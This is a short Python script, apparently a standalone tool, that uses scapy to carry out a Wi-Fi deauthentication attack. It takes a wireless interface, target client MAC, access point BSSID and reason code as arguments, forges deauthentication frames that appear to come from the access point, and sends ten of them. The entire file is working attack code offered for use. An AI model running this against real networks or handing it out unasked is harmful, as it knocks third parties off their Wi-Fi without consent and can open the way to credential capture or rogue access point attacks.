import argparse

from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth

parser = argparse.ArgumentParser(description='Deauth attack based on scapy library.')
parser.add_argument("--interface", required=True, help="Interface used to send packets")
parser.add_argument("--client", required=True, help="Client to target")
parser.add_argument("--bssid", required=True, help="AP to target")
parser.add_argument("--code", required=True, help="Deauthentication code")
args = parser.parse_args()

dot11 = Dot11(addr1=args.client, addr2=args.bssid, addr3=args.bssid)

packetToSend = RadioTap()/dot11/Dot11Deauth(reason=int(args.code))

sendp(packetToSend, inter=0.1, count=10, iface=args.interface)



